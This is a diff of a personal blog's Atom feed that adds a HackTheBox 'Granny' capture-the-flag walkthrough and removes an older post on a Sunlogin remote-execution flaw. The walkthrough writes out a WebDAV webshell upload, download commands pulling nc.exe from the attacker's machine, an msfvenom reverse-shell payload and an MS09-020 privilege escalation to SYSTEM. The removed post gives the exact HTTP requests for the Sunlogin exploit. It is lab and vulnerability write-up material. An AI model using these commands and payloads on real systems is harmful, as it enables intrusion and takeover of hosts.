@@ -2,13 +2,403 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-04-26T13:36:38.885Z</updated>
+    <updated>2022-04-27T12:27:52.517Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
     <logo>https://V-alkoinen.github.io/images/avatar.png</logo>
     <icon>https://V-alkoinen.github.io/favicon.ico</icon>
     <rights>All rights reserved 2022, 老白</rights>
+    <entry>
+        <title type="html"><![CDATA[HackTheBox-granny]]></title>
+        <id>https://V-alkoinen.github.io/post/hackthebox-granny/</id>
+        <link href="https://V-alkoinen.github.io/post/hackthebox-granny/">
+        </link>
+        <updated>2022-04-27T12:21:41.000Z</updated>
+        <content type="html"><![CDATA[<p>10.129.95.234</p>
+<pre><code>Starting Nmap 7.70 ( https://nmap.org ) at 2022-04-27 16:46 CST
+Nmap scan report for 10.129.95.234
+Host is up (0.0028s latency).
+Not shown: 999 filtered ports
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-methods: 
+|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: Under Construction
+| http-webdav-scan: 
+|   WebDAV type: Unkown
+|   Server Type: Microsoft-IIS/6.0
+|   Server Date: Wed, 27 Apr 2022 08:46:50 GMT
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|_  Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2003|2008|2000|XP (88%)
+OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_xp
+Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (88%), Microsoft Windows Server 2003 SP2 (88%), Microsoft Windows Server 2008 Enterprise SP2 (88%), Microsoft Windows 2003 SP2 (87%), Microsoft Windows 2000 SP4 (86%), Microsoft Windows XP (86%), Microsoft Windows XP SP3 (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   2.70 ms 10.10.14.1
+2   2.92 ms 10.129.95.234
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.31 seconds
+
+</code></pre>
+<p>看到可以PUT，尝试PUT shell</p>
+<pre><code>root@Ali-SG /laobai/granny 
+╰─# cp /usr/share/webshells/aspx/cmdasp.aspx .
+╭─root@Ali-SG /laobai/granny 
+╰─# curl -X PUT http://10.129.95.234/laobai.txt --upload-file ./cmdasp.aspx                       
+╭─root@Ali-SG /laobai/granny 
+╰─# curl -X MOVE -H &quot;Destination:http://10.129.95.234/laobai.aspx&quot; http://10.129.95.234/laobai.txt
+
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1651062334716.png" alt="" loading="lazy"></figure>
+<p>搞个交互式shell</p>
+<p>certutil.exe -urlcache -split -f http://10.10.14.6:9998/nc.exe nc.exe</p>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1651062356921.png" alt="" loading="lazy"></figure>
+<p>无果</p>
+<p>powershell (new-object Net.WebClient).DownloadFile('http://10.10.14.6:9998/nc.exe','c:\windows\system32\inetsrv\nc.exe')</p>
+<p>同无果</p>
+<figure data-type="image" tabindex="3"><img src="https://V-alkoinen.github.io/post-images/1651062379099.png" alt="" loading="lazy"></figure>
+<p>systeminfo看了下，server 03 可能是因为版本原因</p>
+<p>使用msfvenom生成马，用curl传上去</p>
+<pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4443 -f aspx &gt; laobai1.aspx                                                                                       2 ↵
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of aspx file: 2748 bytes
+╭─root@Ali-SG ~ 
+╰─# curl -X PUT http://10.129.95.234/laobai1.txt --upload-file ./laobai1.aspx                
+╭─root@Ali-SG ~ 
+╰─# curl -X MOVE -H &quot;Destination:http://10.129.95.234/laobai1.aspx&quot; http://10.129.95.234/laobai1.txt
+╭─root@Ali-SG ~ 
+╰─# nc -nvlp 4443              
+listening on [any] 4443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.129.95.234] 1085
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 424C-F32D
+
+ Directory of c:\windows\system32\inetsrv
+
+04/26/2022  06:08 PM    &lt;DIR&gt;          .
+04/26/2022  06:08 PM    &lt;DIR&gt;          ..
+02/18/2007  03:00 PM            58,880 ADROT.dll
+02/18/2007  03:00 PM           291,328 adsiis.dll
+04/12/2017  10:22 PM    &lt;DIR&gt;          ASP Compiled Templates
+02/18/2007  03:00 PM           388,096 asp.dll
+02/18/2007  03:00 PM            27,478 asp.mfl
+02/18/2007  03:00 PM            21,302 asp.mof
+02/18/2007  03:00 PM            47,104 browscap.dll
+02/18/2007  03:00 PM            32,423 browscap.ini
+02/18/2007  03:00 PM           102,400 CertMap.ocx
+02/18/2007  03:00 PM            82,432 certobj.dll
+02/18/2007  03:00 PM           297,984 CertWiz.ocx
+02/21/2003  06:48 PM             1,844 clusweb.vbs
+02/18/2007  03:00 PM            77,824 Cnfgprts.ocx
+02/18/2007  03:00 PM            64,000 coadmin.dll
+02/18/2007  03:00 PM            33,792 ContRot.dll
+02/18/2007  03:00 PM            27,136 davcdata.exe
+02/18/2007  03:00 PM             6,656 davcprox.dll
+02/18/2007  03:00 PM            25,600 gzip.dll
+04/26/2022  06:08 PM    &lt;DIR&gt;          History
+02/18/2007  03:00 PM           241,664 httpext.dll
+02/18/2007  03:00 PM            18,944 httpmib.dll
+02/18/2007  03:00 PM            48,640 httpodbc.dll
+04/12/2017  05:17 PM            48,993 iis.msc
+02/18/2007  03:00 PM            21,504 iisadmin.dll
+02/18/2007  03:00 PM            21,582 iisadmin.mfl
+02/18/2007  03:00 PM            12,934 iisadmin.mof
+04/12/2017  05:16 PM    &lt;DIR&gt;          iisadmpwd
+02/18/2007  03:00 PM         1,133,056 iiscfg.dll
+02/18/2007  03:00 PM            62,976 iisclex4.dll
+02/18/2007  03:00 PM            82,944 iisext.dll
+02/18/2007  03:00 PM            76,288 iislog.dll
+02/18/2007  03:00 PM           122,880 iisres.dll
+02/18/2007  03:00 PM            28,160 iisrstas.exe
+02/18/2007  03:00 PM           217,088 iisui.dll
+02/18/2007  03:00 PM            68,608 iisuiobj.dll
+02/18/2007  03:00 PM           167,936 iisutil.dll
+02/18/2007  03:00 PM           216,576 iisw3adm.dll
+02/18/2007  03:00 PM           194,560 iiswmi.dll
+02/21/2003  06:48 PM                48 iis_switch.bat
+02/21/2003  06:48 PM             9,709 iis_switch.vbs
+02/18/2007  03:00 PM            14,336 inetinfo.exe
+02/18/2007  03:00 PM         1,058,304 inetmgr.dll
+02/18/2007  03:00 PM            19,456 inetmgr.exe
+02/18/2007  03:00 PM           235,520 infocomm.dll
+02/18/2007  03:00 PM             8,192 isapips.dll
+02/18/2007  03:00 PM            52,736 isatq.dll
+02/18/2007  03:00 PM            19,456 iscomlog.dll
+02/18/2007  03:00 PM            25,600 logscrpt.dll
+02/18/2007  03:00 PM               326 logtemp.sql
+02/18/2007  03:00 PM            67,584 logui.ocx
+02/18/2007  03:00 PM            13,312 lonsint.dll
+04/12/2017  05:17 PM           813,332 MBSchema.bin.00000000h
+04/12/2017  05:17 PM           263,671 MBSchema.xml
+04/12/2017  05:17 PM    &lt;DIR&gt;          MetaBack
+04/26/2022  06:08 PM            43,604 MetaBase.xml
+02/18/2007  03:00 PM           234,496 metadata.dll
+02/18/2007  03:00 PM            61,440 NEXTLINK.dll
+02/18/2007  03:00 PM           187,392 nntpadm.dll
+02/18/2007  03:00 PM         2,663,424 nntpsnap.dll
+02/18/2007  03:00 PM             4,096 rpcref.dll
+02/18/2007  03:00 PM           219,136 seo.dll
+02/18/2007  03:00 PM           179,200 smtpadm.dll
+02/18/2007  03:00 PM         2,086,400 smtpsnap.dll
+02/18/2007  03:00 PM            24,064 ssinc.dll
+02/18/2007  03:00 PM            44,544 svcext.dll
+02/18/2007  03:00 PM           114,176 uihelper.dll
+02/18/2007  03:00 PM            15,360 urlauth.dll
+02/18/2007  03:00 PM            19,456 w3cache.dll
+02/18/2007  03:00 PM            10,752 w3comlog.dll
+02/18/2007  03:00 PM           349,696 w3core.dll
+02/18/2007  03:00 PM            96,808 w3core.mfl
+02/18/2007  03:00 PM            74,002 w3core.mof
+02/18/2007  03:00 PM             6,144 w3ctrlps.dll
+02/18/2007  03:00 PM            24,064 w3ctrs.dll
+02/18/2007  03:00 PM            39,424 w3dt.dll
+02/18/2007  03:00 PM             5,706 w3dt.mfl
+02/18/2007  03:00 PM             6,238 w3dt.mof
+02/18/2007  03:00 PM            92,672 w3ext.dll
+02/18/2007  03:00 PM            62,464 w3isapi.dll
+02/18/2007  03:00 PM             2,738 w3isapi.mfl
+02/18/2007  03:00 PM             2,446 w3isapi.mof
+02/18/2007  03:00 PM            13,312 w3tp.dll
+02/18/2007  03:00 PM             7,168 w3wp.exe
+02/18/2007  03:00 PM            23,040 wam.dll
+02/18/2007  03:00 PM             6,656 wamps.dll
+02/18/2007  03:00 PM            55,808 wamreg.dll
+              82 File(s)     13,749,120 bytes
+               6 Dir(s)   1,384,402,944 bytes free
+
+c:\windows\system32\inetsrv&gt;whoami
+whoami
+nt authority\network service
+
+c:\windows\system32\inetsrv&gt;systeminfo
+systeminfo
+
+Host Name:                 GRANNY
+OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
+OS Version:                5.2.3790 Service Pack 2 Build 3790
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Uniprocessor Free
+Registered Owner:          HTB
+Registered Organization:   HTB
+Product ID:                69712-296-0024942-44782
+Original Install Date:     4/12/2017, 5:07:40 PM
+System Up Time:            0 Days, 19 Hours, 3 Minutes, 17 Seconds
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              INTEL  - 6040000
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
+Total Physical Memory:     1,023 MB
+Available Physical Memory: 734 MB
+Page File: Max Size:       2,470 MB
+Page File: Available:      2,286 MB
+Page File: In Use:         184 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: Q147222
+Network Card(s):           N/A
+
+</code></pre>
+<p>查找可用exp</p>
+<pre><code>╭─root@Ali-SG /laobai/granny 
+╰─# python2 windows-exploit-suggester.py --update                                                                                                                                  1 ↵
+[*] initiating winsploit version 3.3...
+[+] writing to file 2022-04-27-mssb.xls
+[*] done
+╭─root@Ali-SG /laobai/granny 
+╰─# python2 windows-exploit-suggester.py --database 2022-04-27-mssb.xls --systeminfo 1.txt
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (ascii)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 356 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as 'Windows 2003 SP2 32-bit'
+[*] 
+[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
+[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
+[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
+[*] 
+[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
+[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
+[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
+[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
+[*] 
+[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important
+[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
+[*] 
+[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
+[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
+[*] 
+[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
+[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
+[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
+[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC
+[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF
+[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
+[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
+[*] 
+[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
+[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
+[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
+[*] 
+[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
+[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
+[*] 
+[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
+[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
+[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
+[*] 
+[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
+[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
+[*]   http://www.exploit-db.com/exploits/34458/
+[*] 
+[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
+[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
+[*] 
+[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
+[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
+[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
+[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
+[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
+[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
+[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
+[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
+[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
+[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
+[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
+[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
+[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
+[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
+[*] 
+[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
+[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
+[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
+[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
+[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
+[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
+[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
+[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
+[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
+[*] done
+
+</code></pre>
+<p>最后采用ms09-020</p>
+<pre><code>wget https://github.com/Al1ex/WindowsElevation/raw/master/CVE-2009-1535/MS09-020-KB970483-CVE-2009-1535-IIS6.zip
+--2022-04-27 20:02:16--  https://github.com/Al1ex/WindowsElevation/raw/master/CVE-2009-1535/MS09-020-KB970483-CVE-2009-1535-IIS6.zip
+Resolving github.com (github.com)... 20.205.243.166
+Connecting to github.com (github.com)|20.205.243.166|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/Al1ex/WindowsElevation/master/CVE-2009-1535/MS09-020-KB970483-CVE-2009-1535-IIS6.zip [following]
+--2022-04-27 20:02:16--  https://raw.githubusercontent.com/Al1ex/WindowsElevation/master/CVE-2009-1535/MS09-020-KB970483-CVE-2009-1535-IIS6.zip
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 205979 (201K) [application/zip]
+Saving to: ‘MS09-020-KB970483-CVE-2009-1535-IIS6.zip’
+
+MS09-020-KB970483-CVE-2009-1535-IIS6.zip      100%[================================================================================================&gt;] 201.15K  --.-KB/s    in 0.004s  
+
+2022-04-27 20:02:17 (44.8 MB/s) - ‘MS09-020-KB970483-CVE-2009-1535-IIS6.zip’ saved [205979/205979]
+
+╭─root@Ali-SG /laobai/granny 
+╰─# unzip MS09-020-KB970483-CVE-2009-1535-IIS6.zip 
+Archive:  MS09-020-KB970483-CVE-2009-1535-IIS6.zip
+   creating: MS09-020-KB970483-CVE-2009-1535-IIS6/
+  inflating: MS09-020-KB970483-CVE-2009-1535-IIS6/IIS6.0.exe
+
+╭─root@Ali-SG /laobai/granny/MS09-020-KB970483-CVE-2009-1535-IIS6 
+╰─# curl -X PUT http://10.129.95.234/ms09-020.txt --upload-file ./IIS6.0.exe                
+
+╭─root@Ali-SG /laobai/granny/MS09-020-KB970483-CVE-2009-1535-IIS6 
+╰─# curl -X MOVE -H &quot;Destination:http://10.129.95.234/ms09-020.exe&quot; http://10.129.95.234/ms09-020.txt
+</code></pre>
+<pre><code>C:\Inetpub\wwwroot&gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 424C-F32D
+
+ Directory of C:\Inetpub\wwwroot
+
+04/27/2022  03:03 PM    &lt;DIR&gt;          .
+04/27/2022  03:03 PM    &lt;DIR&gt;          ..
+04/27/2022  02:58 PM               253 110.asp
+04/27/2022  03:01 PM               448 1100.asp
+04/12/2017  05:17 PM    &lt;DIR&gt;          aspnet_client
+04/26/2022  06:06 PM             1,400 cmdasp.aspx
+02/21/2003  06:48 PM             1,433 iisstart.htm
+04/12/2017  05:17 PM    &lt;DIR&gt;          images
+04/27/2022  11:51 AM             1,400 laobai.aspx
+04/27/2022  01:06 PM             2,748 laobai1.aspx
+04/27/2022  03:03 PM           211,716 ms09-020.exe
+04/27/2022  02:52 PM               253 ms10-059.exe
+04/27/2022  02:15 PM         4,415,148 ms14-040.exe
+04/27/2022  02:11 PM            11,776 ms14-058.exe
+04/27/2022  02:05 PM               162 ms14-070.exe
+04/27/2022  02:02 PM           135,680 ms15-010.exe
+04/27/2022  01:58 PM            48,128 ms15-051.exe
+04/27/2022  12:59 PM                35 nahjxo.jsp
+04/27/2022  01:51 PM            38,616 nc.exe
+04/27/2022  12:59 PM                 6 nwoqgz.txt
+02/21/2003  06:48 PM             2,806 pagerror.gif
+04/12/2017  05:17 PM             2,440 postinfo.html
+04/27/2022  12:14 PM                35 qzjxlz.jsp
+04/27/2022  12:14 PM                 6 rmhyhe.txt
+04/12/2017  05:17 PM    &lt;DIR&gt;          _private
+04/12/2017  05:17 PM             1,754 _vti_inf.html
+04/12/2017  05:17 PM    &lt;DIR&gt;          _vti_log
+              21 File(s)      4,876,243 bytes
+               6 Dir(s)   1,378,660,352 bytes free
+
+C:\Inetpub\wwwroot&gt;ms09-020.exe &quot;whoami&quot;
+ms09-020.exe &quot;whoami&quot;
+nt authority\system
+-------------------------------------------
+kindle--&gt;Got WMI process Pid: 1960 
+begin to try
+kindle--&gt;Found token SYSTEM 
+kindle--&gt;Command:whoami
+
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[HackTheBox-bastard]]></title>
         <id>https://V-alkoinen.github.io/post/hackthebox-bastard/</id>
@@ -1005,43 +1395,6 @@ proxy-groups:
 <img src="https://V-alkoinen.github.io/post-images/1646132387621.png" alt="" loading="lazy"></p>
 <h1 id="解决方案">解决方案</h1>
 <p>  升级至 <code>v 0.19.10</code></p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[sunlogin RCE]]></title>
-        <id>https://V-alkoinen.github.io/post/sunlogin-rce/</id>
-        <link href="https://V-alkoinen.github.io/post/sunlogin-rce/">
-        </link>
-        <updated>2022-02-16T11:41:52.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="影响范围">影响范围</h1>
-<p> 11.1.1.x<br>
- 10.3.0.27372<br>
- 11.0.0.33162</p>
-<h1 id="漏洞复现">漏洞复现</h1>
-<p> 查看向日葵开放端口：</p>
-<pre><code>tasklist | findstr Sunlogin
-#查找PID
-
-netstat -ano | findstr &lt;pid&gt;
-#查找端口
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1645157954635.png" alt="" loading="lazy"><br>
-<img src="https://V-alkoinen.github.io/post-images/1645157959994.png" alt="" loading="lazy"><br>
- 获取token</p>
-<pre><code>GET /cgi-bin/rpc?action=verify-haras HTTP/1.1
-Host: &lt;ip&gt;:&lt;port&gt;
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1645157986350.png" alt="" loading="lazy"><br>
- 执行命令</p>
-<pre><code>GET /Check?cmd=ping%2e%2e%2f%2e%2e%2fWindows/system32/WindowsPowerShell/v1%2e0/powershell.exe+ipconfig HTTP/1.1
-Host: &lt;ip&gt;:&lt;port&gt;
-Cookie: CID=&lt;token&gt;
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1645158015142.png" alt="" loading="lazy"><br>
- 也可以使用github上的exp<br>
-<img src="https://V-alkoinen.github.io/post-images/1645158303650.png" alt="" loading="lazy"></p>
-<h1 id="漏洞修复">漏洞修复</h1>
-<p> 更新向日葵至最新版</p>
 ]]></content>
     </entry>
 </feed>
